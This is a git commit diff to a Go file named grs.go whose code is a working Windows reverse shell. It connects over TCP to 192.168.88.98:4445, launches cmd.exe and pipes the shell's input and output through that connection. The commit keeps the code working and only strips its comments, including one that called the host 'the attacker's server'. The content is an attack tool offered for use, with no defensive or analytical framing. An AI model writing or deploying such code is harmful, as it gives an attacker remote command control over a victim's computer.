c371438326c5c162bf7f39d3671ae3594a4c3c63
Indra Z <30687786+sigeri94@users.noreply.github.com>
2024-07-25 10:12:58 +0700

    Update grs.go

--- grs.go
+++ grs.go
@@ -7,23 +7,19 @@ import (
 )
 
 func main() {
-	// Connect to the attacker's server
 	conn, err := net.Dial("tcp", "192.168.88.98:4445")
 	if err != nil {
 		return
 	}
 	defer conn.Close()
 
-	// Create a command that runs the shell
 	cmd := exec.Command("cmd.exe")
 
-	// Create pipes for stdin, stdout, and stderr
 	rp, wp := io.Pipe()
 	cmd.Stdin = conn
 	cmd.Stdout = wp
 	cmd.Stderr = wp
 
-	// Start the command
 	go io.Copy(conn, rp)
 	cmd.Run()
 }
